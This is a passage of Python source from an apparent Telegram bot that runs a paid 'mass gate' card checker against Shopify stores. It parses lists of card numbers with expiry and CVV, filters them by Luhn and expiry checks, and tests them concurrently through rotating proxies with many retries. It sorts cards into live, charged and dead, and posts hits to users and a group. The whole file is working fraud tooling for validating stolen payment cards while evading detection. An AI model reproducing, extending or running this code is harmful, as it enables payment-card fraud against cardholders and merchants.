# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    session        = MSH_SESSIONS.get(session_id, {})
    approved_count = session.get('approved', 0)
    dead_count     = session.get('dead', 0)
    charged_count  = session.get('charged', 0)
    checked_count  = session.get('checked', 0)
    buttons = [
        [
            {"text": f"Lɪᴠᴇ ({approved_count})",   "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack(),    "style": "success", "icon_custom_emoji_id": BTN_LIVE_EMOJI_ID},
            {"text": f"Dᴇᴀᴅ ({dead_count})",        "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack(),    "style": "danger",  "icon_custom_emoji_id": BTN_DEAD_EMOJI_ID},
        ],
        [
            {"text": f"Cʜᴀʀɢᴇᴅ ({charged_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack(), "style": "primary", "icon_custom_emoji_id": BTN_CHARGED_EMOJI_ID},
            {"text": f"Aʟʟ ({checked_count})",      "callback_data": MshResultCallback(session_id=session_id, result_type="all").pack(),     "style": "primary", "icon_custom_emoji_id": BTN_ALL_EMOJI_ID},
        ],
    ]
    if is_running:
        buttons.append([{"text": "Sᴛᴏᴘ Cʜᴇᴄᴋɪɴɢ", "callback_data": MshStopCallback(session_id=session_id).pack(), "style": "danger", "icon_custom_emoji_id": BTN_STOP_EMOJI_ID}])
    return {"inline_keyboard": buttons}


def _build_progress_text(session: dict, session_id: str) -> str:
    """Build the progress message text (always with a fresh random charged emoji)."""
    now         = time.time()
    elapsed     = now - session['start_time']
    minutes     = int(elapsed // 60)
    seconds     = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    status = session['status']
    if status == "CHECKING":
        status_line = (
            f'<b><a href="https://t.me/FailureFr_07">[◈]</a> '
            f'Sᴛᴀᴛᴜs ➛ Cʜᴇᴄᴋɪɴɢ <tg-emoji emoji-id="{STATUS_CHECKING_EMOJI_ID}">🔄</tg-emoji></b>'
        )
    elif status == "STOPPED":
        status_line = (
            f'<b><a href="https://t.me/FailureFr_07">[◈]</a> '
            f'Sᴛᴀᴛᴜs ➛ Sᴛᴏᴘᴘᴇᴅ <tg-emoji emoji-id="{STATUS_STOPPED_EMOJI_ID}">🛑</tg-emoji></b>'
        )
    else:
        status_line = (
            f'<b><a href="https://t.me/FailureFr_07">[◈]</a> '
            f'Sᴛᴀᴛᴜs ➛ Fɪɴɪsʜᴇᴅ <tg-emoji emoji-id="{STATUS_FINISHED_EMOJI_ID}">✅</tg-emoji></b>'
        )

    charged_emoji_id = get_random_charged_emoji()

    return (
        f'<b><a href="https://t.me/FailureFr_07">[₪]</a> Gᴀᴛᴇ ➛ Sʜᴏᴘɪꜰʏ | Mass</b>\n'
        f'<b>━━━━━━━━━━━━━━</b>\n'
        f'      {status_line}\n'
        f'      <b><a href="https://t.me/FailureFr_07">[𖣸]</a> Cʜᴇᴄᴋᴇᴅ ➛ <code>{session["checked"]}/{session["total"]}</code></b>\n'
        f'<b>━━━━━━━━━━━━━━</b>\n'
        f'<b>♘ Aᴘᴘʀᴏᴠᴇᴅ ➛ {session["approved"]} <tg-emoji emoji-id="{APPROVED_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>♞ Cʜᴀʀɢᴇᴅ ➛ {session["charged"]} <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>\n'
        f'<b>Dᴇᴀᴅ ➛ {session["dead"]} <tg-emoji emoji-id="{DECLINED_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Eʀʀᴏʀs ➛ {session["errors"]} <tg-emoji emoji-id="{ERROR_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Tɪᴍᴇ ➛ {elapsed_str}</b>'
    )


async def update_progress_message(bot: Bot, session_id: str, force: bool = False):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    now      = time.time()
    last_upd = session.get('last_update_time', 0)

    is_terminal = session['status'] in ("STOPPED", "FINISHED")
    if not force and not is_terminal and (now - last_upd) < 1.0:
        return

    session['last_update_time'] = now
    text    = _build_progress_text(session, session_id)
    chat_id = session['chat_id']
    msg_id  = session['msg_id']
    is_running = session['status'] == "CHECKING"
    buttons = get_result_buttons(session_id, is_running=is_running)

    try:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=text, parse_mode="HTML", reply_markup=buttons,
        )
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e).lower():
            logging.warning(f"[MSH] Progress edit failed: {e}")
    except Exception as e:
        logging.error(f"[MSH] Progress update error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id: str, cc_formatted: str, cc_num: str,
                               user_id: int, bot: Bot, user_obj, plan_emoji_id: str):
    session = MSH_SESSIONS.get(session_id)
    if not session or is_session_stopped(session_id):
        return

    sites_list    = get_sites()
    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager for session {session_id}")
        session['errors'] += 1
        return

    result_status = "ERROR"
    response_msg  = "Unknown Error"
    api_price     = "0.00"
    used_proxy    = None

    MAX_RETRIES    = 40
    last_site_used = None

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except Exception:
        bin_data = {}

    for attempt in range(1, MAX_RETRIES + 1):
        if is_session_stopped(session_id):
            return

        proxy, ok = proxy_manager.get_next_proxy()
        if not proxy:
            session['errors'] += 1
            return
        used_proxy = proxy

        site = random.choice(sites_list)
        last_site_used = site

        try:
            _, message, url, gateway, price, currency, proxy_status_raw, http_status = \
                await process_card_api(cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy)

            if is_session_stopped(session_id):
                return

            api_price = price
            proxy_manager.report_result(proxy, message, http_status)

            if check_if_charged(message):
                result_status = "CHARGED"; response_msg = message; break

            if check_if_approved(message):
                result_status = "APPROVED"; response_msg = message; break

            message_upper = message.upper()
            message_lower = message.lower()

            if "GENERIC_ERROR" in message_upper:
                result_status = "DEAD"; response_msg = message; break

            if any(d.upper() in message_upper for d in DECLINED_RESPONSES):
                result_status = "DEAD"; response_msg = message; break

            if proxy_manager.is_real_proxy_error(message, http_status):
                if attempt == MAX_RETRIES:
                    result_status = "ERROR"; response_msg = f"Proxy Error: {message}"; break
                continue

            if message_lower.startswith("error:") and not message_lower.replace("error:", "").strip():
                if attempt < MAX_RETRIES:
                    continue
                result_status = "ERROR"; response_msg = "Unknown Error"; break

            if any(r.lower() in message_lower for r in RETRY_ERRORS):
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(0.2); continue
                result_status = "ERROR"; response_msg = f"Site Error: {message}"; break

            result_status = "ERROR"; response_msg = message; break

        except asyncio.CancelledError:
            raise
        except Exception as e:
            if is_session_stopped(session_id):
                return
            proxy_manager.report_result(proxy, str(e), None)
            if attempt == MAX_RETRIES:
                result_status = "ERROR"; response_msg = "Connection Error"; break
            continue

    if is_session_stopped(session_id):
        return

    logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg[:60]}")
    session['checked'] += 1

    card_result_data = {
        'card': cc_formatted, 'response': response_msg, 'bin_info': bin_data,
        'price': api_price, 'gateway': 'Shopify', 'timestamp': datetime.now().isoformat(),
    }

    if is_session_stopped(session_id):
        return

    if result_status == "CHARGED":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)
        await asyncio.to_thread(database.update_user_stats, user_id, "charged")
        await asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name)
        if is_session_stopped(session_id):
            return
        _tg_run(send_hit_log_to_group(bot, api_price, user_obj, plan_emoji_id))
        if is_session_stopped(session_id):
            return
        _tg_run(send_charged_msg_to_user(bot, cc_formatted, bin_data, api_price, user_obj, plan_emoji_id))
        await asyncio.sleep(1.0)

    elif result_status == "APPROVED":
        session['approved'] += 1
        session['live_cards'].append(card_result_data)
        await asyncio.to_thread(database.update_user_stats, user_id, "live")
        if is_session_stopped(session_id):
            return
        _tg_run(send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, api_price, user_obj, plan_emoji_id))
        await asyncio.sleep(0.5)

    elif result_status == "DEAD":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)
        await asyncio.to_thread(database.update_user_stats, user_id, "dead")

    elif result_status == "ERROR":
        session['errors'] += 1
        session['error_cards'].append(card_result_data)

    if is_session_stopped(session_id):
        return

    if session['checked'] % 30 == 0 or session['checked'] == session['total']:
        _tg_run(update_progress_message(bot, session_id))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id  = callback_data.session_id
        result_type = callback_data.result_type
        session     = MSH_SESSIONS.get(session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True); return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True); return
        if is_buttons_locked(session_id):
            await callback.answer(f"⏳ Please wait {get_remaining_lock(session_id)}s", show_alert=True); return

        count_map = {
            "charged": len(session.get('charged_cards', [])),
            "live":    len(session.get('live_cards', [])),
            "dead":    len(session.get('dead_cards', [])),
        }
        count = count_map.get(result_type, sum(count_map.values()) + len(session.get('error_cards', [])))
        if count == 0:
            names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            await callback.answer(f"❌ No {names.get(result_type, '')} cards found", show_alert=True); return

        await callback.answer("📦 Generating report...", show_alert=False)
        user_obj    = session.get('user_obj')
        plan_name   = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')
        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)
        file_content = file_buffer.read(); file_buffer.seek(0)
        type_emojis = {"charged": "💎", "live": "✅", "dead": "❌", "all": "📁"}
        type_labels = {"charged": "𝗖𝗛𝗔𝗥𝗚𝗘𝗗", "live": "𝗟𝗶𝘃𝗲", "dead": "𝗗𝗲𝗮𝗱", "all": "𝗔𝗹𝗹"}
        caption = (
            f"𝗥𝗲𝘀𝘂𝗹𝘁 ➛ {type_labels.get(result_type, '𝗔𝗹𝗹')} {type_emojis.get(result_type, '📁')}\n"
            f"𝗧𝗼𝘁𝗮𝗹 ➛ <b>{total_count}</b>\n"
            f"𝗚𝗮𝘁𝗲 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀"
        )
        document = types.BufferedInputFile(file=file_content, filename=filename)
        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id, document=document,
                caption=caption, parse_mode="HTML", reply_to_message_id=user_msg_id,
            )
        except TelegramBadRequest as e:
            if "message to reply not found" in str(e).lower():
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise
    except Exception as e:
        logging.error(f"[MSH] Result callback error: {e}", exc_info=True)
        try:
            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except Exception:
            pass


@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id
        session    = MSH_SESSIONS.get(session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True); return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True); return
        if is_buttons_locked(session_id):
            await callback.answer(f"⏳ Please wait {get_remaining_lock(session_id)}s", show_alert=True); return
        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True); return

        session['status'] = "STOPPED"

        await callback.answer("🛑 Stopping...", show_alert=False)

        tasks_snapshot = [t for t in session.get('tasks', []) if not t.done()]
        thread_loop    = session.get('thread_loop')
        if tasks_snapshot and thread_loop and not thread_loop.is_closed():
            async def _do_cancel(tlist):
                for t in tlist:
                    t.cancel()
            asyncio.run_coroutine_threadsafe(_do_cancel(tasks_snapshot), thread_loop)

        logging.info(f"🛑 [MSH] Stop requested for session {session_id} ({len(tasks_snapshot)} tasks)")

        await update_progress_message(callback.bot, session_id, force=True)

    except Exception as e:
        logging.error(f"[MSH] Stop callback error: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error stopping", show_alert=True)
        except Exception:
            pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /msh COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
async def msh_command(message: types.Message):
    if not await asyncio.to_thread(database.is_gate_enabled, "msh"):
        await message.reply("🚧 <b>𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    user    = message.from_user
    user_id = user.id
    bot     = message.bot

    _set_main_loop(asyncio.get_event_loop())

    # 1. CHECK PLAN / PREMIUM STATUS
    if not database.is_premium_active(user_id):
        await message.reply(
            "<b>❌ Access Denied.</b>\n"
            "<b>You must have an active plan to use this gate.</b>\n"
            "<b>Please purchase a plan to continue.</b>",
            parse_mode="HTML",
            reply_markup=buy_now_keyboard()
        )
        return

    for sid, sdata in list(MSH_SESSIONS.items()):
        if sdata.get('user_id') == user_id and sdata.get('status') == "CHECKING":
            await message.reply(
                "⚠️ <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\nYou have a check running. Use the <b>🛑 Stop</b> button to stop it.",
                parse_mode="HTML",
            )
            return

    proxies = load_msh_proxies()
    if not proxies:
        await message.reply(
            "⚠️ <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\nPlace rotating proxies (one per line) in <code>mass_gates/px.txt</code>.",
            parse_mode="HTML",
        )
        return

    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts    = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "

    if message.reply_to_message:
        replied = message.reply_to_message
        raw_text += (replied.text or replied.caption or "") + " "

    document = message.document or (message.reply_to_message.document if message.reply_to_message else None)
    if document:
        if document.file_size > 2 * 1024 * 1024:
            await message.reply("❌ File too large. Max 2MB."); return
        try:
            file_info    = await bot.get_file(document.file_id)
            byte_content = await bot.download_file(file_info.file_path)
            if byte_content:
                data = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}"); return

    if not raw_text.strip():
        await message.reply(
            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/msh cc|mm|yy|cvv</code>\n"
            "• Reply to a message containing cards with <code>/msh</code>\n"
            "• Attach a <code>.txt</code> file and send with <code>/msh</code>",
            parse_mode="HTML",
        )
        return

    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("❌ No valid card formats found."); return

    valid_cards, expired_count, invalid_luhn_count = [], 0, 0
    for card_string in extracted_cards:
        if len(valid_cards) >= 10000:
            break
        p = card_string.split('|')
        if len(p) != 4:
            continue
        cc, mm, yy, cvv = p
        if not luhn_check(cc):
            invalid_luhn_count += 1; continue
        if is_expired(mm, yy):
            expired_count += 1; continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        info = (f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
                if (expired_count or invalid_luhn_count) else "")
        await message.reply(f"{info}❌ No valid cards to check.", parse_mode="HTML")
        return

    is_group = message.chat.type in ("group", "supergroup", "channel")
    asyncio.create_task(
        process_mass_check_background(message, bot, valid_cards, user, proxies, is_group)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND SESSION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(message: types.Message, bot: Bot, valid_cards: list,
                                        user_obj, proxies: list, is_group: bool = False):
    user_id     = user_obj.id
    chat_id     = message.chat.id
    total_cards = len(valid_cards)

    if total_cards == 0:
        await message.reply("❌ No valid cards to check.", parse_mode="HTML"); return

    session_id    = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name     = await get_user_plan_name(user_id)
    plan_emoji_id = await get_user_plan_emoji_id(user_id)
    proxy_manager = ProxyManager(proxies, session_id)

    logging.info(f"🔄 [MSH] Session {session_id} | {proxy_manager.get_available_count()} proxies | {total_cards} cards")

    charged_emoji_id = get_random_charged_emoji()
    initial_text = (
        f'<b><a href="https://t.me/FailureFr_07">[₪]</a> Gᴀᴛᴇ ➛ Sʜᴏᴘɪꜰʏ | Mass</b>\n'
        f'<b>━━━━━━━━━━━━━━</b>\n'
        f'      <b><a href="https://t.me/FailureFr_07">[◈]</a> Sᴛᴀᴛᴜs ➛ Cʜᴇᴄᴋɪɴɢ <tg-emoji emoji-id="{STATUS_CHECKING_EMOJI_ID}">🔄</tg-emoji></b>\n'
        f'      <b><a href="https://t.me/FailureFr_07">[𖣸]</a> Cʜᴇᴄᴋᴇᴅ ➛ <code>0/{total_cards}</code></b>\n'
        f'<b>━━━━━━━━━━━━━━</b>\n'
        f'<b>♘ Aᴘᴘʀᴏᴠᴇᴅ ➛ 0 <tg-emoji emoji-id="{APPROVED_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>♞ Cʜᴀʀɢᴇᴅ ➛ 0 <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>\n'
        f'<b>Dᴇᴀᴅ ➛ 0 <tg-emoji emoji-id="{DECLINED_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Eʀʀᴏʀs ➛ 0 <tg-emoji emoji-id="{ERROR_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Tɪᴍᴇ ➛ 0s</b>'
    )
    initial_buttons = get_result_buttons(session_id, is_running=True)
    progress_msg    = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)

    MSH_SESSIONS[session_id] = {
        "session_id": session_id, "status": "CHECKING",
        "chat_id": chat_id, "user_id": user_id,
        "msg_id": progress_msg.message_id, "user_msg_id": message.message_id,
        "total": total_cards, "checked": 0, "approved": 0, "charged": 0, "dead": 0, "errors": 0,
        "start_time": time.time(), "tasks": [], "proxies": proxies, "proxy_manager": proxy_manager,
        "last_update_time": 0,
        "live_cards": [], "dead_cards": [], "charged_cards": [], "error_cards": [],
        "user_obj": user_obj, "plan_name": plan_name, "plan_emoji_id": plan_emoji_id,
        "is_group": is_group, "thread_loop": None,
    }

    logging.info(f"🚀 [MSH] Started {session_id} | {total_cards} cards | user {user_id}")

    main_loop = asyncio.get_event_loop()
    await main_loop.run_in_executor(
        _USER_THREAD_POOL,
        _run_session_in_thread,
        bot, session_id, valid_cards, user_obj, plan_emoji_id, main_loop,
    )


def _run_session_in_thread(bot, session_id, cards, user_obj, plan_emoji_id, main_loop):
    thread_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(thread_loop)
    session = MSH_SESSIONS.get(session_id)
    if session:
        session['thread_loop'] = thread_loop
    try:
        thread_loop.run_until_complete(
            _session_async_worker(bot, session_id, cards, user_obj, plan_emoji_id, main_loop)
        )
    except Exception as e:
        logging.error(f"[MSH] Session thread {session_id} crashed: {e}", exc_info=True)
    finally:
        try:
            thread_loop.close()
        except Exception:
            pass


async def _session_async_worker(bot, session_id, cards, user_obj, plan_emoji_id, main_loop):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    sem = asyncio.Semaphore(50)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    session['user_id'], bot, user_obj, plan_emoji_id,
                )
            except asyncio.CancelledError:
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"[MSH] Worker error {cc_formatted}: {e}")

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        session['tasks'].append(task)

    logging.info(f"📋 [MSH] {len(tasks)} tasks created for session {session_id}")

    if tasks:
        results   = await asyncio.gather(*tasks, return_exceptions=True)
        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
        errors    = sum(1 for r in results if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError))
        if cancelled:
            logging.info(f"🛑 [MSH] {cancelled} tasks cancelled in {session_id}")
        if errors:
            logging.error(f"[MSH] {errors} tasks failed in {session_id}")

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "STOPPED":
        session['status'] = "FINISHED"
        _tg_run(update_progress_message(bot, session_id, force=True))
